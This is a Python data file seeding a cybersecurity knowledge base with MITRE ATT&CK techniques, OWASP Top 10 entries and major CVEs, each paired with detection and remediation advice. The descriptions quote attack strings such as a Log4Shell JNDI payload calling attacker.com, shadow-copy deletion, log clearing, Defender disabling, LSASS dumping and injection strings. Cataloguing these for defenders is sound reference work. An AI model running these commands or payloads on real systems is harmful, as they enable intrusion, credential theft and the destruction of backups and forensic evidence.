# Curated cybersecurity intelligence knowledge base: MITRE ATT&CK, OWASP Top 10, and high-impact CVEs.

CYBERSECURITY_KNOWLEDGE_SEED = [
    # =========================================================================
    # MITRE ATT&CK TECHNIQUES
    # =========================================================================
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1059.001",
        "name": "Command and Scripting Interpreter: PowerShell",
        "category": "Execution",
        "description": "Adversaries may use PowerShell commands and scripts to execute malicious commands, download secondary payloads, and interact with the Windows OS. PowerShell is often executed with flags like -ExecutionPolicy Bypass, -WindowStyle Hidden, -EncodedCommand (-enc), and uses download cradles like DownloadString, WebClient, or Invoke-Expression (IEX).",
        "detection_remediation": "Detection: Monitor Script Block Logging (Event ID 4104), Process Creation (Event ID 4688, Sysmon Event ID 1) for powershell.exe with -enc, -w hidden, or Invoke-Expression. Remediation: Enable Constrained Language Mode, AppLocker, and PowerShell Transcription."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1059.003",
        "name": "Command and Scripting Interpreter: Windows Command Shell",
        "category": "Execution",
        "description": "Adversaries may abuse cmd.exe to execute commands and batch files (.bat, .cmd). Often used to perform discovery, run administrative utilities (whoami, net user, ipconfig, tasklist), or spawn malicious processes.",
        "detection_remediation": "Detection: Monitor process tree where cmd.exe is spawned by office applications (winword.exe, excel.exe), browsers, or web server processes (w3wp.exe). Remediation: Restrict execution of cmd.exe for regular users and monitor unusual parent-child process pairs."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1078",
        "name": "Valid Accounts",
        "category": "Defense Evasion, Persistence, Privilege Escalation, Initial Access",
        "description": "Adversaries may obtain and abuse credentials of existing domain, local, cloud, or service accounts. Compromised valid accounts allow attackers to blend in with legitimate network traffic, bypass MFA, and maintain persistence without generating malware alerts.",
        "detection_remediation": "Detection: Analyze anomalous login times, geo-impossible logins, unusual host access, and Event ID 4624 (Logon Type 3 or 10). Remediation: Implement Multi-Factor Authentication (FIDO2), Least Privilege Access, and frequent credential rotation for privileged service accounts."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1566.001",
        "name": "Phishing: Spearphishing Attachment",
        "category": "Initial Access",
        "description": "Adversaries send spearphishing emails with malicious attachments (macros in .docm/.xlsm, ISO, ZIP, LNK shortcuts, PDF, or HTML smuggling) to execute malicious code on the victim system when opened.",
        "detection_remediation": "Detection: Email gateway attachment inspection, Sysmon Event ID 11 (File creation in AppData/Temp by mail clients), Office spawning script interpreters. Remediation: Disable macros via Group Policy, block executable/archive attachments at mail gateway, user awareness training."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1566.002",
        "name": "Phishing: Spearphishing Link",
        "category": "Initial Access",
        "description": "Adversaries send targeted emails containing links leading to credential harvesting landing pages (fake Microsoft 365, Okta, VPN portals) or drive-by download sites.",
        "detection_remediation": "Detection: URL reputation analysis, proxy logs showing newly registered domains (NRDs), and typo-squatted domains. Remediation: Web filtering, DNS-layer security, DMARC/DKIM/SPF enforcement, FIDO2 hardware tokens resistant to reverse proxy phishing (e.g. Evilginx)."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1003.001",
        "name": "OS Credential Dumping: LSASS Memory",
        "category": "Credential Access",
        "description": "Adversaries may attempt to access and dump Local Security Authority Subsystem Service (LSASS) memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets using tools such as Mimikatz, procdump, comsvcs.dll, or Nanodump.",
        "detection_remediation": "Detection: Sysmon Event ID 10 (ProcessAccess to lsass.exe with PROCESS_VM_READ permissions), Event ID 4656, command lines with procdump.exe -ma lsass.exe or rundll32.exe comsvcs.dll MiniDump. Remediation: Enable Windows Defender Credential Guard, LSA Protection (RunAsPPL), and remove local administrative rights."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1003.002",
        "name": "OS Credential Dumping: Security Account Manager (SAM)",
        "category": "Credential Access",
        "description": "Adversaries may extract the Security Account Manager (SAM) registry hive (HKLM\\SAM, HKLM\\SYSTEM) to crack local user account password hashes using reg.exe save or volume shadow copies.",
        "detection_remediation": "Detection: Command lines containing 'reg save hklm\\sam' or 'reg save hklm\\system', access to %SystemRoot%\\System32\\config\\SAM. Remediation: Audit registry access, restrict registry export privileges."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1021.001",
        "name": "Remote Services: Remote Desktop Protocol (RDP)",
        "category": "Lateral Movement",
        "description": "Adversaries may log into remote systems using RDP (port 3389) with compromised credentials to execute commands and move laterally through the enterprise network.",
        "detection_remediation": "Detection: Windows Event ID 4624 (Logon Type 10 - RemoteInteractive), Event ID 1149 in TerminalServices-RemoteConnectionManager. Remediation: Disable RDP where not required, enforce Network Level Authentication (NLA), restrict RDP via firewall to jump hosts only."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1021.002",
        "name": "Remote Services: SMB/Windows Admin Shares",
        "category": "Lateral Movement",
        "description": "Adversaries may use SMB (port 445) to connect to administrative shares (C$, ADMIN$, IPC$) to transfer malware and execute remote tasks using PsExec, SMBexec, or WMI.",
        "detection_remediation": "Detection: Event ID 5140 and 5145 (A network share object was accessed for ADMIN$ or C$), creation of PsExec-like services. Remediation: Block SMB (445) between internal workstations, isolate admin subnets."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1053.005",
        "name": "Scheduled Task/Job: Scheduled Task",
        "category": "Persistence, Privilege Escalation, Execution",
        "description": "Adversaries may create or modify scheduled tasks using schtasks.exe or PowerShell to maintain persistence across reboots or run elevated tasks with SYSTEM privileges.",
        "detection_remediation": "Detection: Event ID 4698 (A scheduled task was created), Event ID 4702 (Scheduled task updated), command line schtasks /create. Remediation: Audit task scheduler, restrict schtasks permissions, alert on newly created tasks executing from Temp, AppData, or Public folders."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1190",
        "name": "Exploit Public-Facing Application",
        "category": "Initial Access",
        "description": "Adversaries may exploit vulnerabilities (such as SQL injection, SSRF, Deserialization, or Remote Code Execution) in Internet-facing web servers, firewalls, VPN gateways, or APIs to gain unauthorized access.",
        "detection_remediation": "Detection: Web Application Firewall (WAF) alerts, IDS/IPS signatures, web server process (w3wp.exe, nginx, apache) spawning cmd.exe, bash, or python. Remediation: Immediate security patching, virtual patching via WAF, network segmentation for DMZ hosts."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1486",
        "name": "Data Encrypted for Impact (Ransomware)",
        "category": "Impact",
        "description": "Adversaries encrypt files on target systems and delete backups to disrupt business operations and extort ransom. Attackers commonly execute 'vssadmin delete shadows /all /quiet', 'wbadmin delete catalog', and 'bcdedit /set {default} bootstatuspolicy ignoreallfailures' before encrypting files.",
        "detection_remediation": "Detection: Command lines invoking vssadmin.exe delete shadows, rapid burst of file rename and write operations with unusual extensions, ransom note drops. Remediation: Immutable offline backups, Controlled Folder Access, EDR anti-ransomware behavioral blockers."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1047",
        "name": "Windows Management Instrumentation (WMI)",
        "category": "Execution",
        "description": "Adversaries may use WMI (wmic.exe or PowerShell Get-WmiObject/Invoke-WmiMethod) to execute commands locally or remotely, collect system discovery info, and establish persistent event consumers.",
        "detection_remediation": "Detection: Event ID 5861 (WMI-Activity), process creation of wmic.exe process call create. Remediation: Disable or audit WMI remote namespace access, restrict DCOM permissions."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1070.001",
        "name": "Indicator Removal on Host: Clear Windows Event Logs",
        "category": "Defense Evasion",
        "description": "Adversaries may clear Windows Event Logs using wevtutil.exe (e.g. 'wevtutil cl Security' or 'wevtutil cl System') or PowerShell Clear-EventLog to hinder forensic investigations and cover tracks.",
        "detection_remediation": "Detection: Event ID 1102 (The audit log was cleared) in Security log, Event ID 104 in System log, process execution of wevtutil.exe cl. Remediation: Stream logs in real-time to a centralized SIEM, restrict SeSecurityPrivilege."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1071.001",
        "name": "Application Layer Protocol: Web Protocols",
        "category": "Command and Control",
        "description": "Adversaries communicate with Command and Control (C2) servers using standard HTTP/HTTPS traffic to blend in with legitimate web traffic and bypass perimeter egress inspections.",
        "detection_remediation": "Detection: Beaconing detection (regular periodic intervals), SSL inspection for self-signed or untrusted certificates, user-agent anomalies. Remediation: TLS inspection proxy, domain reputation blocking."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1547.001",
        "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "category": "Persistence",
        "description": "Adversaries add entries to Run and RunOnce registry keys (e.g., HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run or HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) to execute malware upon user logon.",
        "detection_remediation": "Detection: Sysmon Event ID 12/13 (Registry modification of Run keys), Autoruns auditing. Remediation: Lock down registry permissions, monitor and alert on new keys in Run/RunOnce paths."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1105",
        "name": "Ingress Tool Transfer",
        "category": "Command and Control, Lateral Movement",
        "description": "Adversaries transfer tools, scripts, and exploits from external systems using native binaries (LOLBins) such as certutil.exe (-urlcache -split -f), bitsadmin.exe, curl.exe, or PowerShell download cradles.",
        "detection_remediation": "Detection: Command line certutil -urlcache or bitsadmin /transfer, outgoing connections from unexpected LOLBins. Remediation: Restrict Internet egress access from servers, block LOLBin network activity."
    },
    {
        "framework": "MITRE ATT&CK",
        "technique_id": "T1562.001",
        "name": "Impair Defenses: Disable or Modify Tools",
        "category": "Defense Evasion",
        "description": "Adversaries modify security software settings to avoid detection, such as executing 'Set-MpPreference -DisableRealtimeMonitoring $true' or stopping security services with 'sc stop WinDefend'.",
        "detection_remediation": "Detection: Windows Defender Event ID 5001 (Real-time protection disabled), PowerShell Set-MpPreference commands, Event ID 7036 (service stopped). Remediation: Enable Tamper Protection in Microsoft Defender, restrict administrative privileges."
    },

    # =========================================================================
    # OWASP TOP 10 (2021)
    # =========================================================================
    {
        "framework": "OWASP Top 10",
        "technique_id": "OWASP-A01:2021",
        "name": "Broken Access Control",
        "category": "Web Application Security",
        "description": "Failures in enforcing restrictions on authenticated users. Flaws include Insecure Direct Object References (IDOR), unauthorized URL access, bypassing access checks by modifying metadata, and vertical or horizontal privilege escalation.",
        "detection_remediation": "Detection: Web logs showing access to unauthorized resource IDs, parameter tampering. Remediation: Enforce server-side role-based access control (RBAC), deny by default, disable directory browsing."
    },
    {
        "framework": "OWASP Top 10",
        "technique_id": "OWASP-A02:2021",
        "name": "Cryptographic Failures",
        "category": "Web Application Security",
        "description": "Exposure of sensitive data (PII, passwords, credit cards) due to weak encryption algorithms (MD5, SHA1, DES), hardcoded secret keys, lack of TLS in transit, or improper key management.",
        "detection_remediation": "Detection: Unencrypted HTTP traffic, weak TLS cipher suites, exposed secrets in repositories. Remediation: Enforce TLS 1.3, use strong authenticated ciphers (AES-GCM), encrypt data at rest, use secret management vaults."
    },
    {
        "framework": "OWASP Top 10",
        "technique_id": "OWASP-A03:2021",
        "name": "Injection (SQL, Command, LDAP)",
        "category": "Web Application Security",
        "description": "Hostile data sent to an interpreter as part of a command or query. Includes SQL Injection (' OR 1=1 --, UNION SELECT), OS Command Injection (; cat /etc/passwd), and LDAP injection.",
        "detection_remediation": "Detection: WAF SQLi/RCE rule hits, database error disclosures, anomalous database query volume. Remediation: Use parameterized queries/prepared statements, input validation, object-relational mappers (ORM), least privilege database accounts."
    },
    {
        "framework": "OWASP Top 10",
        "technique_id": "OWASP-A05:2021",
        "name": "Security Misconfiguration",
        "category": "Web Application Security",
        "description": "Unsecured default configurations, unpatched flaws, verbose stack traces, open cloud storage buckets, unneeded services enabled, and missing security headers (CSP, HSTS).",
        "detection_remediation": "Detection: Vulnerability scanners (Nessus, Nuclei), HTTP responses containing server versions, exposed debug consoles. Remediation: Hardened base images, automated configuration audits, disable unnecessary features and debug flags."
    },
    {
        "framework": "OWASP Top 10",
        "technique_id": "OWASP-A10:2021",
        "name": "Server-Side Request Forgery (SSRF)",
        "category": "Web Application Security",
        "description": "Occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing attackers to coerce the server to send requests to internal infrastructure or cloud metadata services (e.g., http://169.254.169.254).",
        "detection_remediation": "Detection: Outbound HTTP requests to private IP ranges (RFC 1918) or 169.254.169.254, unexpected internal network traversal. Remediation: Enforce strict URL allowlists, disable HTTP redirections, block access to metadata endpoints via IMDSv2."
    },

    # =========================================================================
    # HIGH-IMPACT CVEs AND EXPLOITS
    # =========================================================================
    {
        "framework": "CVE Knowledge",
        "technique_id": "CVE-2021-44228",
        "name": "Log4Shell: Apache Log4j2 JNDI Remote Code Execution",
        "category": "Remote Code Execution",
        "description": "Critical vulnerability in Apache Log4j2 versions 2.0 to 2.14.1 where JNDI lookup features do not protect against attacker-controlled LDAP and RMI requests. Payloads commonly use patterns like ${jndi:ldap://attacker.com/exploit} or obfuscated variants like ${${lower:j}ndi:}.",
        "detection_remediation": "Detection: Web logs, User-Agent, and headers containing '${jndi:', outbound LDAP/RMI connections from Java processes. Remediation: Upgrade Log4j to 2.17.1+, remove JndiLookup class (zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class)."
    },
    {
        "framework": "CVE Knowledge",
        "technique_id": "CVE-2020-1472",
        "name": "Zerologon: Netlogon Cryptographic Flaw (Elevation of Privilege)",
        "category": "Privilege Escalation",
        "description": "Flaw in the AES-CFB8 implementation of the Netlogon protocol in Windows Server. An unauthenticated attacker with network access to a Domain Controller can send zeroed plaintext to forge authentication and reset the domain controller computer account password to blank.",
        "detection_remediation": "Detection: Windows Event ID 4742 (A computer account was changed) targeting DC accounts, Event ID 5829 (unsecure Netlogon connection). Remediation: Enforce secure Netlogon RPC connections via Microsoft security updates."
    },
    {
        "framework": "CVE Knowledge",
        "technique_id": "CVE-2017-0144",
        "name": "EternalBlue: Microsoft SMBv1 Remote Code Execution (MS17-010)",
        "category": "Remote Code Execution, Lateral Movement",
        "description": "Vulnerability in Microsoft Server Message Block 1.0 (SMBv1) protocol allowing unauthenticated remote attackers to execute arbitrary code with SYSTEM privileges via crafted packets. Heavily utilized in WannaCry, NotPetya, and ransomware worm propagation.",
        "detection_remediation": "Detection: IDS signature for SMB Tree Connect / Trans2 secondary requests, sudden port 445 scanning burst across subnets. Remediation: Completely disable SMBv1 (Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol), apply patch MS17-010."
    },
    {
        "framework": "CVE Knowledge",
        "technique_id": "CVE-2023-4966",
        "name": "Citrix Bleed: Citrix NetScaler ADC / Gateway Sensitive Information Disclosure",
        "category": "Credential Access, Initial Access",
        "description": "Buffer overread vulnerability in Citrix NetScaler ADC and NetScaler Gateway configured as an AAA virtual server. Attackers send crafted HTTP GET requests to /oauth/idp/.well-known/openid-configuration to extract memory contents containing valid authenticated session tokens, completely bypassing MFA.",
        "detection_remediation": "Detection: HTTP requests with overly long Host headers to OpenID endpoints, sudden logins with valid session cookies from new foreign IPs. Remediation: Upgrade NetScaler firmware immediately and terminate all active user sessions."
    },
    {
        "framework": "CVE Knowledge",
        "technique_id": "CVE-2024-3094",
        "name": "XZ Utils Liblzma Backdoor: Supply Chain Compromise",
        "category": "Supply Chain / Backdoor",
        "description": "Malicious code injected into XZ Utils tarballs versions 5.6.0 and 5.6.1 that hooks OpenSSH sshd authentication functions to allow remote pre-authentication code execution by attackers holding a specific private key.",
        "detection_remediation": "Detection: Package manager audits for xz-utils 5.6.0/5.6.1 on Linux distributions. Remediation: Downgrade xz-utils to known safe version 5.4.x, rebuild systems potentially compromised."
    },
    {
        "framework": "CVE Knowledge",
        "technique_id": "CVE-2024-21887",
        "name": "Ivanti Connect Secure / Policy Secure Command Injection",
        "category": "Remote Code Execution",
        "description": "A vulnerability in the web components of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure allows an authenticated administrator or an attacker chained with CVE-2023-46805 (auth bypass) to send crafted requests and execute arbitrary commands with root privileges.",
        "detection_remediation": "Detection: Outbound network activity from appliance to external C2 IPs, requests to /api/v1/cav/client/status endpoints. Remediation: Apply Ivanti security mitigation XML and latest patches, run External Integrity Checker Tool."
    }
]
